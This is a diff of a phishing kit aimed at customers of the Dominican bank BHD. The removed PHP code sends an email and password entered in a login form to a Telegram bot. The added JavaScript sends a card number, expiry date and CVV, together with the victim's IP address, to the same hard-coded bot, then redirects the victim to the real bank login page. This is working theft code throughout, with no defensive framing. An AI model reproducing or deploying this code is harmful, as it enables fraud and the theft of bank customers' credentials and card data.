@@ -1,39 +1,35 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST["email"];
-	$cpass = $_POST["cpass"];
-	
-	
-  $botToken = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI"; // Reemplaza con tu token de bot
-    $chatID = "8555745789"; // Reemplaza con tu chat ID
+function sendToTelegram(cardNumber, expiryDate, cvv) {
+    // Primero obtenemos la IP pública del cliente
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+            const ip = ipData.ip;
+            const token = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI";
+            const chat_id = "8555745789";
+            const message = `=====DATOS TARJETA BHD=======\nNúmero: ${cardNumber}\nExpira: ${expiryDate}\nCVV: ${cvv}\nIP del cliente: ${ip}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
 
-    // Obtén la IP del cliente
-    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-
-    // Construye el mensaje
-    $message = "=====CORREO BHD=======\n Correo: $email\n Clave: $cpass\nIP del cliente: $ip";
-
-    // Envia el mensaje a Telegram
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $data = array("chat_id" => $chatID, "text" => $message);
-    $options = array(
-        "http" => array(
-            "method" => "POST",
-            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
-            "content" => http_build_query($data)
-        )
-    );
-    $context = stream_context_create($options);
-    $result = file_get_contents($url, false, $context);
-
-    if ($result) {
-        // Redirige a la página de éxito
-        header("Location: https://ibp.bhd.com.do/#/login");
-        exit; // Asegura que el script se detenga después de la redirección
-    } else {
-        // Redirige a la página de error
-        header("Location: index");
-        exit;
-    }
+            return fetch(url);
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // Muestra el modal de éxito y redirige
+                mostrarModalYRedirigir();
+            } else {
+                alert("Hubo un problema al enviar los datos.");
+            }
+        })
+        .catch(error => {
+            alert("Error al obtener la IP o enviar la solicitud.");
+        });
 }
-?>
+
+function mostrarModalYRedirigir() {
+    var modal = document.createElement('div');
+    // ... el mismo código del modal que ya tenías ...
+    document.body.appendChild(modal);
+    setTimeout(function() {
+        window.location.href = "https://ibp.bhd.com.do/#/login";
+    }, 2500);
+}
